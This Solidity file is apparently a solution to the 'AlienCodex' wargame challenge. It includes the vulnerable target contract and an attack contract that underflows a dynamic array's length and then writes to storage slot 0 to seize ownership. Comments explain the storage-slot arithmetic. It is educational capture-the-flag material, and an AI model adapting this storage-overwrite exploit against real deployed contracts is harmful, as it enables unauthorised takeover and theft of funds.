// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract HackAlien {
    AlienCodex codex;
    uint256 public checkArrayPosition;

    constructor(address _codex) {
        codex = AlienCodex(_codex);
    }

    function attack() external {
        codex.makeContact();
        //After retract array.length would be 2^256
        codex.retract();

        //0 - 2^256 = 0
        //0 - (2^256 -1) = 0
        //slot a + i = slot 0
        //a + i = 0
        // so i = 0 - a
        uint256 arrayFirstElementPosition = uint256(keccak256(abi.encode(uint256(1))));
        checkArrayPosition = arrayFirstElementPosition;

        uint256 slotHackNum;

        unchecked {
            slotHackNum -= arrayFirstElementPosition;
        }

        bytes32 myByteAddress = bytes32(uint256(uint160(msg.sender))); //bytes32(abi.encodePacked(msg.sender));

        codex.revise(slotHackNum, myByteAddress);

        require(codex.owner() == msg.sender, "You are not the owner");
    }
}

interface AlienCodex {
    //each slots takes 32 bytes
    //there is total of 2 ^ 256 slots in a smart contract
    //2^256 -1 - biggest possible value
    //owner - slot 0 - takes 20 bytes, contact ( 1 byte)
    //slot 1 - the coddex array - length of the array - 0 initially - 2^256 - 1 after we call retract
    //startingPosition = keccac256(abi.encodePacked(1))) - for the position of the first array element - using hash functions to revtrieve array info
    //INFO - we use abi.encodePacked() - to encode the base slot number
    //INFO - we use the keccak256 to hash the encoded value
    //INFO - if we have a second array created one more slot after the other - uint256 n, bytes32[] b, uint256 m, uint256[] d
    //INFO - keccack256(abi.encodePacked(1)) + i - to get the slot position for the first array b
    //INFo - keccack256(abi.encodePacked(3)) + i - to get the slot position for the second array d
    //slot startingPosition - codex[0]
    //slot startingPosition + 1 = codex[1]
    //slot startingPosition + 2 = codex[2]
    //slot startingPosition + (2 ^ 256 - 1) = codex[2^256-1]
    function owner() external view returns (address);
    function makeContact() external;
    function record(bytes32 _content) external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

//``````````````````````````````````````````````````````````
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../helpers/Ownable-05.sol";

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}
